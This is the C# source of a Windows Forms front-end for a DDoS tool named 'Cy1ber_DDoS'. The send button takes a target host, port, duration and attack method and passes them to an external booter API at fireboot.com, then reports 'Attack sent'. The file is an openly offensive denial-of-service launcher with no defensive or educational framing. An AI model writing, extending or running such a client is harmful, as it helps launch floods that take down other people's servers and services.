using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Cy1ber_DDoS
{
    public partial class MainHub : MetroFramework.Forms.MetroForm
    {
        public MainHub()
        {
            InitializeComponent();
        }

        private void MainHub_Load(object sender, EventArgs e)
        {

        }

        private void metroTextBox1_Click(object sender, EventArgs e)
        {

        }

        private void send_Click(object sender, EventArgs e)
        {

            {
                string host = host1.Text;
                string port = port1.Text;
                string time = time1.Text;
                string method = method1.Text;

                WebClient wc = new WebClient { }; wc.DownloadString($"https://fireboot.com/api/v1.php?host={host}&port={port}&time={time}&method={method}");
                MessageBox.Show($"Attack sent to {host} using port {port} for {time} Second/s");

            }
        }
    }
}
